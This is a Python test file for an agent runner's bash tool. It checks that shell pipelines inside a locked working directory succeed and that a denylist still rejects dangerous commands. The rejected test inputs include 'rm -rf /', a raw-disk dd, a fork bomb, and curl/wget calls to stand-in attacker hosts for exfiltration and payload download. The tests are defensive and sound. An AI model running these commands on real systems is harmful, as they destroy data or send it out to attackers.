"""OP-809: ``bash_handler`` runs under ``/bin/bash -c`` (``shell=True``)
anchored to ``cwd=BASE_DIR``.

Locks the contract specified in
``docs/adr/ADR-0014-runner-bash-shell-mode.md``:

* The 5-pattern denylist still rejects catastrophic / data-exfiltration
  invocations: ``rm -rf /``, ``dd if=/dev/``, the canonical fork bomb,
  ``mount`` / ``umount``, and ``curl`` / ``wget`` egress to a host that
  isn't on the loopback allowlist.
* Five shell-pipeline shapes that the previous ``_SHELL_METACHARS``
  blacklist rejected now succeed end-to-end inside ``BASE_DIR`` —
  including ``find | grep``, the workflow Sonnet 4.6 wedged on during
  the OP-32 pilot.
* The cwd lock pins relative paths to ``BASE_DIR`` (``pwd`` and
  redirect-targets resolve there), even though absolute-path access is
  still possible (and accepted as residual risk per ADR-0014).
"""

from __future__ import annotations

from pathlib import Path

import pytest

from backend.agents import runner_handlers
from backend.agents.runner_handlers import _validate_bash_command, bash_handler


@pytest.fixture
def base_dir(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    monkeypatch.setattr(runner_handlers, "BASE_DIR", tmp_path.resolve())
    return tmp_path.resolve()


# ─── Five commands previously rejected by _SHELL_METACHARS now succeed ──


def test_pipe_find_grep_succeeds(base_dir: Path) -> None:
    """The Sonnet 4.6 wedge case: ``find | grep`` over the worktree."""
    (base_dir / "alpha.py").write_text("hello\n")
    (base_dir / "beta.py").write_text("world\n")
    (base_dir / "notes.txt").write_text("ignore\n")
    out = bash_handler({"command": "find . -name '*.py' | grep alpha"})
    assert "EXIT_CODE: 0" in out
    assert "alpha.py" in out
    assert "beta.py" not in out


def test_redirect_to_file_inside_base_dir_succeeds(base_dir: Path) -> None:
    """``python -c '...' > out.txt`` lands inside the cwd-locked BASE_DIR."""
    out = bash_handler(
        {"command": "python3 -c 'print(\"redirected\")' > out.txt"}
    )
    assert "EXIT_CODE: 0" in out
    assert (base_dir / "out.txt").read_text().strip() == "redirected"


def test_command_chain_with_double_ampersand_succeeds(base_dir: Path) -> None:
    """``cmd1 && cmd2`` short-circuits like a real shell."""
    out = bash_handler({"command": "echo first && echo second"})
    assert "EXIT_CODE: 0" in out
    assert "first" in out
    assert "second" in out


def test_command_substitution_succeeds(base_dir: Path) -> None:
    """``$(...)`` substitution is allowed."""
    out = bash_handler({"command": 'echo "hello $(echo world)"'})
    assert "EXIT_CODE: 0" in out
    assert "hello world" in out


def test_input_redirection_inside_base_dir_succeeds(base_dir: Path) -> None:
    """``cat < file`` reads from a file inside BASE_DIR."""
    (base_dir / "input.txt").write_text("from-stdin\n")
    out = bash_handler({"command": "cat < input.txt"})
    assert "EXIT_CODE: 0" in out
    assert "from-stdin" in out


# ─── Five dangerous patterns still rejected ─────────────────────────────


def test_rm_rf_root_rejected(base_dir: Path) -> None:
    with pytest.raises(ValueError, match="absolute root or system path"):
        bash_handler({"command": "rm -rf /"})


def test_rm_rf_root_after_chained_command_rejected(base_dir: Path) -> None:
    """Chained statements are scanned too — ``echo hi; rm -rf /`` is denied."""
    with pytest.raises(ValueError, match="absolute root or system path"):
        bash_handler({"command": "echo hi; rm -rf /"})


def test_rm_rf_etc_rejected(base_dir: Path) -> None:
    with pytest.raises(ValueError, match="absolute root or system path"):
        bash_handler({"command": "rm -rf /etc"})


def test_dd_to_raw_device_rejected(base_dir: Path) -> None:
    with pytest.raises(ValueError, match="raw /dev/ block device"):
        bash_handler({"command": "dd if=/dev/zero of=/dev/sda"})


def test_fork_bomb_rejected(base_dir: Path) -> None:
    with pytest.raises(ValueError, match="fork bomb"):
        bash_handler({"command": ":(){ :|: & };:"})


def test_mount_rejected(base_dir: Path) -> None:
    with pytest.raises(ValueError, match="mount/umount"):
        bash_handler({"command": "mount -t tmpfs none /mnt"})


def test_umount_rejected(base_dir: Path) -> None:
    with pytest.raises(ValueError, match="mount/umount"):
        bash_handler({"command": "umount /mnt"})


def test_curl_to_external_host_rejected(base_dir: Path) -> None:
    with pytest.raises(ValueError, match="not on allowlist"):
        bash_handler({"command": "curl https://evil.example.com/exfil"})


def test_wget_to_external_host_rejected(base_dir: Path) -> None:
    with pytest.raises(ValueError, match="not on allowlist"):
        bash_handler({"command": "wget http://attacker.test/payload"})


def test_curl_without_url_rejected(base_dir: Path) -> None:
    """Without a parseable URL we can't allowlist the host — refuse."""
    with pytest.raises(ValueError, match="without an allowlisted URL"):
        bash_handler({"command": "curl --config /tmp/curlrc"})


# ─── Loopback egress is allowed ─────────────────────────────────────────


def test_curl_to_localhost_validates(base_dir: Path) -> None:
    """``curl localhost`` must pass validation (network call may fail at
    runtime but the validator must not block it)."""
    # Validator-level check only — don't actually open a socket here.
    assert _validate_bash_command(
        "curl http://localhost:8080/health"
    ).startswith("curl")
    assert _validate_bash_command(
        "wget http://127.0.0.1/page"
    ).startswith("wget")


# ─── cwd lock ───────────────────────────────────────────────────────────


def test_pwd_resolves_to_base_dir(base_dir: Path) -> None:
    """The cwd lock means ``pwd`` always reports BASE_DIR even when the
    command itself contains shell features that could otherwise re-anchor
    the working directory."""
    out = bash_handler({"command": "pwd && echo done"})
    assert str(base_dir) in out
    assert "done" in out


def test_relative_paths_resolve_under_base_dir(base_dir: Path) -> None:
    (base_dir / "subdir").mkdir()
    out = bash_handler(
        {"command": "echo tucked > subdir/file.txt && cat subdir/file.txt"}
    )
    assert "EXIT_CODE: 0" in out
    assert (base_dir / "subdir" / "file.txt").read_text().strip() == "tucked"


# ─── Synthetic Sonnet pilot proxy: validator accepts the OP-32 wedge ────


def test_op32_pilot_workflow_accepted_by_validator(base_dir: Path) -> None:
    """OP-32-equivalent pilot exhausted max_iterations because the
    pre-OP-809 validator kept rejecting Sonnet's ``find | grep`` /
    ``cmd1 && cmd2`` shapes. The validator must now accept the full
    transcript so the live pilot can complete inside the iteration
    budget. Live-API completion is verified out-of-band per the ticket
    description; this test locks the validator-side contract."""
    pilot_commands = [
        "find . -name '*.py' | grep -v __pycache__ | head -5",
        "ls -la && pwd",
        "cat README.md | head -20",
        "echo 'analysis complete' > analysis.txt && wc -l analysis.txt",
        "python3 -c 'import sys; print(sys.version)' 2>&1",
    ]
    for cmd in pilot_commands:
        # Each must validate without raising.
        assert _validate_bash_command(cmd) == cmd.strip()
